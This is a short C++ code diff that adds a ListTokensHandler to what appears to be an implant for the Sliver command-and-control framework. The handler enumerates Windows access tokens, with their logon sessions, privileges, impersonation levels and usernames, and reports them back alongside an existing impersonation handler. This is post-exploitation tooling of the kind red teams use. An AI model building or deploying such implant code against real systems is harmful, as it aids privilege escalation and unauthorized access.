@@ -254,7 +254,31 @@ namespace handlers {
 		}
 		return wrapResponse(taskID, resp);
 	}
-
+	sliverpb::Envelope ListTokensHandler(int64_t taskID, string data) {
+		sliverpb::ListTokensReq req;
+		sliverpb::ListTokens resp;
+		req.ParseFromString(data);
+		try {
+			auto tokens = token::ListTokens();
+			for (auto it = tokens.begin();it != tokens.end();++it) {
+				auto token = resp.add_tokens();
+				token->set_tokenid(*((uint64_t*)(&(it->TokenId))));
+				token->set_logonsessionid(*((uint64_t*)(&(it->LogonSessionId))));
+				token->set_logontype(it->LogonType);
+				token->set_privilegescount(it->PrivilegesCount);
+				token->set_tokenimplevel(it->TokenImpLevel);
+				token->set_tokentype(it->TokenType);
+				token->set_tokenintegrity(it->TokenIntegrity);
+				token->set_username(utils::ws2s(it->Username));
+			}
+		}
+		catch (exception& e) {
+			auto common_resp = new sliverpb::Response();
+			common_resp->set_err(std::format("ListTokens triggered exception: {}", e.what()));
+			resp.set_allocated_response(common_resp);
+		}
+		return wrapResponse(taskID, resp);
+	}
 	sliverpb::Envelope impersonateHandler(int64_t taskID, string data) {
 		sliverpb::ImpersonateReq req;
 		req.ParseFromString(data);
